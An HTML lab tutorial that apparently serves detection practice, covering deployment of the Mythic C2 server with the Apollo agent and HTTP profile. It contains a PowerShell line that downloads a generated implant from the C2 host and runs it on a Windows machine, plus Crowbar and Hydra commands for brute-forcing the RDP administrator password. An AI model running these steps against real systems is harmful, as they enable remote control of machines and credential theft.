<h1>Mythic C2 Deployment with Payload and Brute Force Testing</h1>

<nav>
  <h3>📚 Table of Contents</h3>
  <ul>
    <li><a href="#demo">Deploy Mythic Server</a></li>
    <li><a href="#setup">Install and Configure Mythic</a></li>
    <li><a href="#secure">Secure the Server (Firewall)</a></li>
    <li><a href="#access">Access Mythic Web GUI</a></li>
    <li><a href="#post-setup">Post-Setup: Install Apollo & HTTP C2</a></li>
    <li><a href="#payload">Payload Hosting & Execution</a></li>
    <li><a href="#brute-force">Crowbar & Hydra for RDP Brute Force</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>

<h2 id="demo">💻 Deploy Mythic Server</h2>
<ul>
  <li>Deploy a Vultr instance:
    <ul>
      <li>OS: <code>Ubuntu 22.04</code></li>
      <li>RAM: <code>4GB</code></li>
      <li>Region: <code>Toronto</code></li>
    </ul>
  </li>
  <li>Download Kali Linux (VMware image)</li>
  <li>SSH into server:
    <pre><code>ssh root@&lt;server-ip&gt;</code></pre>
  </li>
</ul>

<h2 id="setup">⚙️ Install and Configure Mythic</h2>
<ol>
  <li>Update system:
    <pre><code>
apt-get update
apt-get upgrade -y
    </code></pre>
  </li>
  <li>Install Docker (clean and reinstall from official repo):
    <pre><code>
apt-get remove docker docker-engine docker.io containerd runc -y
apt-get install ca-certificates curl gnupg lsb-release -y
mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
apt-get update
apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
    </code></pre>
  </li>
  <li>Install Make:
    <pre><code>apt install make -y</code></pre>
  </li>
  <li>Clone and install Mythic:
    <pre><code>
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
./install_docker_ubuntu.sh
    </code></pre>
  </li>
  <li>Start Docker:
    <pre><code>
systemctl restart docker
systemctl enable docker
systemctl status docker
    </code></pre>
  </li>
  <li>Start Mythic:
    <pre><code>
make
mythic-cli start
    </code></pre>
  </li>
</ol>

<h2 id="secure">🔒 Secure the Server (Firewall)</h2>
<ul>
  <li>Create a Vultr firewall group</li>
  <li>Allow TCP ports <code>1–65535</code> for:
    <ul>
      <li>Your IP</li>
      <li>Kali Linux IP</li>
      <li>Windows Server IP</li>
    </ul>
  </li>
  <li>Assign firewall to the Mythic server</li>
</ul>

<h2 id="access">🌐 Access Mythic Web GUI</h2>
<ul>
  <li>Open:
    <pre><code>https://&lt;server-ip&gt;:7443</code></pre>
  </li>
  <li>If HTTPS warning, manually prepend <code>https://</code></li>
  <li>Get credentials:
    <pre><code>
ls -la
cat .env
    </code></pre>
  </li>
  <li>Login with <code>mythic_admin</code> and password from `.env`</li>
  <li>🌓 Toggle dark mode using the sun/moon icon</li>
</ul>

<h2 id="post-setup">🛠 Post-Setup: Install Apollo & HTTP C2</h2>
<ul>
  <li>Install Apollo Agent:
    <pre><code>
cd ~/Mythic
mythic-cli install github https://github.com/MythicAgents/apollo
    </code></pre>
  </li>
  <li>Install HTTP C2 profile:
    <pre><code>
mythic-cli install github https://github.com/MythicC2Profiles/http
    </code></pre>
  </li>
  <li>Restart Mythic:
    <pre><code>
mythic-cli stop
mythic-cli start
    </code></pre>
  </li>
</ul>

<h2 id="payload">📦 Payload Hosting & Execution</h2>
<ol>
  <li>In Mythic GUI → Payloads → Actions → Generate New Payload</li>
  <li>Select:
    <ul>
      <li>Platform: Windows</li>
      <li>Agent: Apollo</li>
      <li>C2: HTTP</li>
      <li>Output: EXE</li>
      <li>Callback Host: Public IP</li>
      <li>Port: 80</li>
    </ul>
  </li>
  <li>Host via Python:
    <pre><code>python3 -m http.server 9999</code></pre>
  </li>
  <li>On Windows (PowerShell):
    <pre><code>
Invoke-WebRequest -Uri http://&lt;mythic-ip&gt;:9999/&lt;payload.exe&gt; -OutFile C:\Users\Public\Downloads\payload.exe
Start-Process "C:\Users\Public\Downloads\payload.exe"
    </code></pre>
  </li>
  <li>Check Mythic for Callback → Interact → Run Commands</li>
</ol>

<h2 id="brute-force">🔨 Brute Force Testing: Crowbar & Hydra</h2>

<h3>Option 1: Crowbar</h3>
<pre><code>
sudo apt-get install crowbar -y
crowbar -b rdp -u administrator -C mydfir-wordlist.txt -s &lt;target-ip&gt;/32
</code></pre>

<h3>Option 2: Hydra (if Crowbar fails)</h3>
<pre><code>
sudo apt install hydra -y
hydra -l administrator -P mydfir-wordlist.txt rdp://&lt;target-ip&gt;
</code></pre>

<h2 id="conclusion">🤔 Conclusion</h2>
<ul>
  <li>Successfully deployed and accessed Mythic C2 with Apollo agent and HTTP profile</li>
  <li>Executed payload, confirmed callbacks, and tested brute-force detection via Crowbar and Hydra</li>
</ul>

<p>🔗 <a href="https://github.com/MythicAgents/Apollo" target="_blank">Mythic Apollo Commands Reference</a></p>
